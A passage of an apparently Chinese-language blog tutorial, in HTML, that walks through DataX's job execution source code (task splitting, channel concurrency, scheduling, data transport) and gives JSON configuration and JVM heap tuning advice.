class="line">    <span class="keyword">boolean</span> hasException = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> isDryRun = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.startTimeStamp = System.currentTimeMillis();</span><br><span class="line">        isDryRun = configuration.getBool(CoreConstant.DATAX_JOB_SETTING_DRYRUN, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">if</span>(isDryRun) &#123;</span><br><span class="line">            LOG.info(<span class="string">"jobContainer starts to do preCheck ..."</span>);</span><br><span class="line">            <span class="keyword">this</span>.preCheck();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            userConf = configuration.clone();</span><br><span class="line">            LOG.debug(<span class="string">"jobContainer starts to do preHandle ..."</span>);</span><br><span class="line">            <span class="comment">//Job 前置操作</span></span><br><span class="line">            <span class="keyword">this</span>.preHandle();</span><br><span class="line"></span><br><span class="line">            LOG.debug(<span class="string">"jobContainer starts to do init ..."</span>);</span><br><span class="line">            <span class="comment">//初始化 reader 和 writer</span></span><br><span class="line">            <span class="keyword">this</span>.init();</span><br><span class="line">            LOG.info(<span class="string">"jobContainer starts to do prepare ..."</span>);</span><br><span class="line">            <span class="comment">//全局准备工作，比如 odpswriter 清空目标表</span></span><br><span class="line">            <span class="keyword">this</span>.prepare();</span><br><span class="line">            LOG.info(<span class="string">"jobContainer starts to do split ..."</span>);</span><br><span class="line">            <span class="comment">//拆分 Task</span></span><br><span class="line">            <span class="keyword">this</span>.totalStage = <span class="keyword">this</span>.split();</span><br><span class="line">            LOG.info(<span class="string">"jobContainer starts to do schedule ..."</span>);</span><br><span class="line">            <span class="keyword">this</span>.schedule();</span><br><span class="line">            LOG.debug(<span class="string">"jobContainer starts to do post ..."</span>);</span><br><span class="line">            <span class="keyword">this</span>.post();</span><br><span class="line"></span><br><span class="line">            LOG.debug(<span class="string">"jobContainer starts to do postHandle ..."</span>);</span><br><span class="line">            <span class="keyword">this</span>.postHandle();</span><br><span class="line">            LOG.info(<span class="string">"DataX jobId [&#123;&#125;] completed successfully."</span>, <span class="keyword">this</span>.jobId);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.invokeHooks();</span><br><span class="line">       ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、Task-切分逻辑">3、Task 切分逻辑</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行reader和writer最细粒度的切分，需要注意的是，writer的切分结果要参照reader的切分结果，</span></span><br><span class="line"><span class="comment"> * 达到切分后数目相等，才能满足1：1的通道模型，所以这里可以将reader和writer的配置整合到一起，</span></span><br><span class="line"><span class="comment"> * 然后，为避免顺序给读写端带来长尾影响，将整合的结果shuffler掉</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">split</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.adjustChannelNumber();</span><br><span class="line">    ......</span><br><span class="line">     List&lt;Configuration&gt; readerTaskConfigs = <span class="keyword">this</span></span><br><span class="line">            .doReaderSplit(<span class="keyword">this</span>.needChannelNumber);</span><br><span class="line">    <span class="keyword">int</span> taskNumber = readerTaskConfigs.size();</span><br><span class="line">    List&lt;Configuration&gt; writerTaskConfigs = <span class="keyword">this</span></span><br><span class="line">            .doWriterSplit(taskNumber);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//并发数的确定</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">adjustChannelNumber</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> needChannelNumberByByte = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">int</span> needChannelNumberByRecord = Integer.MAX_VALUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> isByteLimit = (<span class="keyword">this</span>.configuration.getInt(</span><br><span class="line">            CoreConstant.DATAX_JOB_SETTING_SPEED_BYTE, <span class="number">0</span>) &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (isByteLimit) &#123;</span><br><span class="line">        <span class="keyword">long</span> globalLimitedByteSpeed = <span class="keyword">this</span>.configuration.getInt(</span><br><span class="line">                CoreConstant.DATAX_JOB_SETTING_SPEED_BYTE, <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在byte流控情况下，单个Channel流量最大值必须设置，否则报错！</span></span><br><span class="line">        Long channelLimitedByteSpeed = <span class="keyword">this</span>.configuration</span><br><span class="line">                .getLong(CoreConstant.DATAX_CORE_TRANSPORT_CHANNEL_SPEED_BYTE);</span><br><span class="line">        <span class="keyword">if</span> (channelLimitedByteSpeed == <span class="keyword">null</span> || channelLimitedByteSpeed &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> DataXException.asDataXException(</span><br><span class="line">                    FrameworkErrorCode.CONFIG_ERROR,</span><br><span class="line">                    <span class="string">"在有总bps限速条件下，单个channel的bps值不能为空，也不能为非正数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        needChannelNumberByByte =</span><br><span class="line">                (<span class="keyword">int</span>) (globalLimitedByteSpeed / channelLimitedByteSpeed);</span><br><span class="line">        needChannelNumberByByte =</span><br><span class="line">                needChannelNumberByByte &gt; <span class="number">0</span> ? needChannelNumberByByte : <span class="number">1</span>;</span><br><span class="line">        LOG.info(<span class="string">"Job set Max-Byte-Speed to "</span> + globalLimitedByteSpeed + <span class="string">" bytes."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> isRecordLimit = (<span class="keyword">this</span>.configuration.getInt(</span><br><span class="line">            CoreConstant.DATAX_JOB_SETTING_SPEED_RECORD, <span class="number">0</span>)) &gt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (isRecordLimit) &#123;</span><br><span class="line">        <span class="keyword">long</span> globalLimitedRecordSpeed = <span class="keyword">this</span>.configuration.getInt(</span><br><span class="line">                CoreConstant.DATAX_JOB_SETTING_SPEED_RECORD, <span class="number">100000</span>);</span><br><span class="line"></span><br><span class="line">        Long channelLimitedRecordSpeed = <span class="keyword">this</span>.configuration.getLong(</span><br><span class="line">                CoreConstant.DATAX_CORE_TRANSPORT_CHANNEL_SPEED_RECORD);</span><br><span class="line">        <span class="keyword">if</span> (channelLimitedRecordSpeed == <span class="keyword">null</span> || channelLimitedRecordSpeed &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> DataXException.asDataXException(FrameworkErrorCode.CONFIG_ERROR,</span><br><span class="line">                    <span class="string">"在有总tps限速条件下，单个channel的tps值不能为空，也不能为非正数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        needChannelNumberByRecord =</span><br><span class="line">                (<span class="keyword">int</span>) (globalLimitedRecordSpeed / channelLimitedRecordSpeed);</span><br><span class="line">        needChannelNumberByRecord =</span><br><span class="line">                needChannelNumberByRecord &gt; <span class="number">0</span> ? needChannelNumberByRecord : <span class="number">1</span>;</span><br><span class="line">        LOG.info(<span class="string">"Job set Max-Record-Speed to "</span> + globalLimitedRecordSpeed + <span class="string">" records."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取较小值</span></span><br><span class="line">    <span class="keyword">this</span>.needChannelNumber = needChannelNumberByByte &lt; needChannelNumberByRecord ?</span><br><span class="line">            needChannelNumberByByte : needChannelNumberByRecord;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果从byte或record上设置了needChannelNumber则退出</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.needChannelNumber &lt; Integer.MAX_VALUE) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> isChannelLimit = (<span class="keyword">this</span>.configuration.getInt(</span><br><span class="line">            CoreConstant.DATAX_JOB_SETTING_SPEED_CHANNEL, <span class="number">0</span>) &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (isChannelLimit) &#123;</span><br><span class="line">        <span class="keyword">this</span>.needChannelNumber = <span class="keyword">this</span>.configuration.getInt(</span><br><span class="line">                CoreConstant.DATAX_JOB_SETTING_SPEED_CHANNEL);</span><br><span class="line"></span><br><span class="line">        LOG.info(<span class="string">"Job set Channel-Number to "</span> + <span class="keyword">this</span>.needChannelNumber</span><br><span class="line">                + <span class="string">" channels."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> DataXException.asDataXException(</span><br><span class="line">            FrameworkErrorCode.CONFIG_ERROR,</span><br><span class="line">            <span class="string">"Job运行速度必须设置"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、调度">4、调度</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JobContainer.java</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * schedule首先完成的工作是把上一步reader和writer split的结果整合到具体taskGroupContainer中,</span></span><br><span class="line"><span class="comment"> * 同时不同的执行模式调用不同的调度策略，将所有任务调度起来</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">schedule</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这里的全局speed和每个channel的速度设置为B/s</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> channelsPerTaskGroup = <span class="keyword">this</span>.configuration.getInt(</span><br><span class="line">            CoreConstant.DATAX_CORE_CONTAINER_TASKGROUP_CHANNEL, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">int</span> taskNumber = <span class="keyword">this</span>.configuration.getList(</span><br><span class="line">            CoreConstant.DATAX_JOB_CONTENT).size();</span><br><span class="line">    <span class="comment">//确定的 channel 数和切分的 task 数取最小值，避免浪费</span></span><br><span class="line">    <span class="keyword">this</span>.needChannelNumber = Math.min(<span class="keyword">this</span>.needChannelNumber, taskNumber);</span><br><span class="line">    PerfTrace.getInstance().setChannelNumber(needChannelNumber);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过获取配置信息得到每个taskGroup需要运行哪些tasks任务</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    List&lt;Configuration&gt; taskGroupConfigs = JobAssignUtil.assignFairly(<span class="keyword">this</span>.configuration,</span><br><span class="line">            <span class="keyword">this</span>.needChannelNumber, channelsPerTaskGroup);</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">        scheduler.schedule(taskGroupConfigs);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 公平的分配 task 到对应的 taskGroup 中。</span></span><br><span class="line"><span class="comment"> * 公平体现在：会考虑 task 中对资源负载作的 load 标识进行更均衡的作业分配操作。</span></span><br><span class="line"><span class="comment"> * TODO 具体文档举例说明</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Configuration&gt; <span class="title">assignFairly</span><span class="params">(Configuration configuration, <span class="keyword">int</span> channelNumber, <span class="keyword">int</span> channelsPerTaskGroup)</span> </span>&#123;</span><br><span class="line">    Validate.isTrue(configuration != <span class="keyword">null</span>, <span class="string">"框架获得的 Job 不能为 null."</span>);</span><br><span class="line"></span><br><span class="line">    List&lt;Configuration&gt; contentConfig = configuration.getListConfiguration(CoreConstant.DATAX_JOB_CONTENT);</span><br><span class="line">    Validate.isTrue(contentConfig.size() &gt; <span class="number">0</span>, <span class="string">"框架获得的切分后的 Job 无内容."</span>);</span><br><span class="line"></span><br><span class="line">    Validate.isTrue(channelNumber &gt; <span class="number">0</span> &amp;&amp; channelsPerTaskGroup &gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">"每个channel的平均task数[averTaskPerChannel]，channel数目[channelNumber]，每个taskGroup的平均channel数[channelsPerTaskGroup]都应该为正数"</span>);</span><br><span class="line">    <span class="comment">//TODO 确定 taskgroup 的数量</span></span><br><span class="line">    <span class="keyword">int</span> taskGroupNumber = (<span class="keyword">int</span>) Math.ceil(<span class="number">1.0</span> * channelNumber / channelsPerTaskGroup);</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要实现的效果通过例子来说是：</span></span><br><span class="line"><span class="comment">     * a 库上有表：0, 1, 2</span></span><br><span class="line"><span class="comment">     * b 库上有表：3, 4</span></span><br><span class="line"><span class="comment">     * c 库上有表：5, 6, 7</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 如果有 4个 taskGroup</span></span><br><span class="line"><span class="comment">     * 则 assign 后的结果为：</span></span><br><span class="line"><span class="comment">     * taskGroup-0: 0,  4,</span></span><br><span class="line"><span class="comment">     * taskGroup-1: 3,  6,</span></span><br><span class="line"><span class="comment">     * taskGroup-2: 5,  2,</span></span><br><span class="line"><span class="comment">     * taskGroup-3: 1,  7</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    List&lt;Configuration&gt; taskGroupConfig = doAssign(resourceMarkAndTaskIdMap, configuration, taskGroupNumber);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调整 每个 taskGroup 对应的 Channel 个数（属于优化范畴）</span></span><br><span class="line">    adjustChannelNumPerTaskGroup(taskGroupConfig, channelNumber);</span><br><span class="line">    <span class="keyword">return</span> taskGroupConfig;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//AbstractScheduler.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">schedule</span><span class="params">(List&lt;Configuration&gt; configurations)</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 丢线程池运行</span></span><br><span class="line">    startAllTaskGroup(configurations);</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5、数据传输">5、数据传输</h2><p>找到<code>TaskGroupContainer.start()—&gt; taskExecutor.doStart()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.writerThread.start();</span><br><span class="line">    <span class="comment">// reader 没有起来，writer 不可能结束</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.writerThread.isAlive() || <span class="keyword">this</span>.taskCommunication.getState() == State.FAILED) &#123;</span><br><span class="line">    <span class="keyword">throw</span> DataXException.asDataXException(</span><br><span class="line">    FrameworkErrorCode.RUNTIME_ERROR,</span><br><span class="line">    <span class="keyword">this</span>.taskCommunication.getThrowable());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.readerThread.start();</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以看看 generateRunner()</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">        taskReader.init();</span><br><span class="line">        ......</span><br><span class="line">        taskReader.prepare();</span><br><span class="line">        ......</span><br><span class="line">        taskReader.startRead(recordSender);</span><br><span class="line">        ......</span><br><span class="line">        taskReader.post();</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">        ......</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">比如看 MysqlReader 的 startReader 方法</span><br><span class="line">-》CommonRdbmsReaderTask.startRead()</span><br><span class="line">-》transportOneRecord()</span><br><span class="line">-》sendToWriter()</span><br><span class="line">-》BufferedRecordExchanger. flush()</span><br><span class="line">-》Channel.pushAll()</span><br><span class="line">-》Channel.statPush()</span><br></pre></td></tr></table></figure><h1>五、DataX 使用优化</h1><h2 id="1、关键参数">1、关键参数</h2><ul><li>job.setting.speed.channel : channel 并发数</li><li>job.setting.speed.record : 全局配置 channel 的 record 限速</li><li>job.setting.speed.byte：全局配置 channel 的 byte 限速</li><li>core.transport.channel.speed.record：单个 channel 的 record 限速</li><li>core.transport.channel.speed.byte：单个 channel 的 byte 限速</li></ul><h2 id="2、优化-1：提升每个-channel-的速度">2、优化 1：提升每个 channel 的速度</h2><p>在 DataX 内部对每个 Channel 会有严格的速度控制，分两种，一种是控制每秒同步的记录数，另外一种是每秒同步的字节数，默认的速度限制是 1MB/s，可以根据具体硬件情况设置这个 byte 速度或者 record 速度，一般设置 byte 速度，比如：我们可以把单个 Channel 的速度上限配置为 5MB</p><h2 id="3、优化-2：提升-DataX-Job-内-Channel-并发数">3、优化 2：提升 DataX Job 内 Channel 并发数</h2><p><strong>并发数 = taskGroup 的数量 * 每个 TaskGroup 并发执行的 Task 数 (默认为 5)</strong>。提升 job 内 Channel 并发有三种配置方式：</p><h3 id="3-1-配置全局-Byte-限速以及单-Channel-Byte-限速">3.1 配置全局 Byte 限速以及单 Channel Byte 限速</h3><p>Channel 个数 = 全局 Byte 限速 / 单 Channel Byte 限速</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"core"</span>: &#123;</span><br><span class="line">    <span class="attr">"transport"</span>: &#123;</span><br><span class="line">      <span class="attr">"channel"</span>: &#123;</span><br><span class="line">        <span class="attr">"speed"</span>: &#123;</span><br><span class="line">          <span class="attr">"byte"</span>: <span class="number">1048576</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"job"</span>: &#123;</span><br><span class="line">    <span class="attr">"setting"</span>: &#123;</span><br><span class="line">      <span class="attr">"speed"</span>: &#123;</span><br><span class="line">        <span class="attr">"byte"</span> : <span class="number">5242880</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    ......</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>core.transport.channel.speed.byte=1048576，job.setting.speed.byte=5242880，所以 Channel个数 = 全局 Byte 限速 / 单 Channel Byte 限速=5242880/1048576=5 个</p><h3 id="3-2-配置全局-Record-限速以及单-Channel-Record-限速">3.2 配置全局 Record 限速以及单 Channel Record 限速</h3><p>Channel 个数 = 全局 Record 限速 / 单 Channel Record 限速</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"core"</span>: &#123;</span><br><span class="line">    <span class="attr">"transport"</span>: &#123;</span><br><span class="line">      <span class="attr">"channel"</span>: &#123;</span><br><span class="line">        <span class="attr">"speed"</span>: &#123;</span><br><span class="line">          <span class="attr">"record"</span>: <span class="number">100</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"job"</span>: &#123;</span><br><span class="line">    <span class="attr">"setting"</span>: &#123;</span><br><span class="line">      <span class="attr">"speed"</span>: &#123;</span><br><span class="line">        <span class="attr">"record"</span> : <span class="number">500</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    ......</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>core.transport.channel.speed.record=100 ， job.setting.speed.record=500, 所 以 配 置 全 局Record 限速以及单 Channel Record 限速，Channel 个数 = 全局 Record 限速 / 单 ChannelRecord 限速=500/100=5</p><h3 id="3-3-直接配置-Channel-个数">3.3 直接配置 Channel 个数</h3><p>只有在上面两种未设置才生效，上面两个同时设置是取值小的作为最终的 channel 数</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"job"</span>: &#123;</span><br><span class="line">    <span class="attr">"setting"</span>: &#123;</span><br><span class="line">      <span class="attr">"speed"</span>: &#123;</span><br><span class="line">        <span class="attr">"channel"</span> : <span class="number">5</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    ......</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接配置 job.setting.speed.channel=5，所以 job 内 Channel 并发=5 个</p><h2 id="4、优化-3：提高-JVM-堆内存">4、优化 3：提高 JVM 堆内存</h2><p>当提升 DataX Job 内 Channel 并发数时，内存的占用会显著增加，因为 DataX 作为数据交换通道，在内存中会缓存较多的数据。例如 Channel 中会有一个 Buffer，作为临时的数据交换的缓冲区，而在部分 Reader 和 Writer 的中，也会存在一些 Buffer，为了防止 OOM 等错误，调大 JVM 的堆内存。</p><p>建议将内存设置为 4G 或者 8G，这个也可以根据实际情况来调整。调整 JVM xms xmx 参数的两种方式：一种是直接更改 <a href="http://datax.py" target="_blank" rel="noopener">datax.py</a> 脚本；另一种是在启动的时候，加上对应的参数，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python datax/bin/datax.py --jvm=<span class="string">"-Xms8G -Xmx8G"</span> XXX.json</span><br></pre></td></tr></table></figure><h1>六、DataX脚本</h1><p>python生成datax配置文件脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 